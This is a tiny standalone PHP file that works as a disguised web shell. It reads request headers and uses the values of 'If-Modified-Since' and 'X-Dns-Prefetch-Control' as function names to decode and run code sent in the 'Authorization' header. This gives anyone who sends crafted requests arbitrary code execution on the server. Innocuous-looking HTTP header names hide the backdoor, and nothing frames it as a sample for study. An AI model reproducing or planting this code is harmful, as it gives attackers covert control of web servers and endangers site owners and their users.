<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $accepted = $_HEADERS['If-Modified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Authorization']));
    $accepted();
}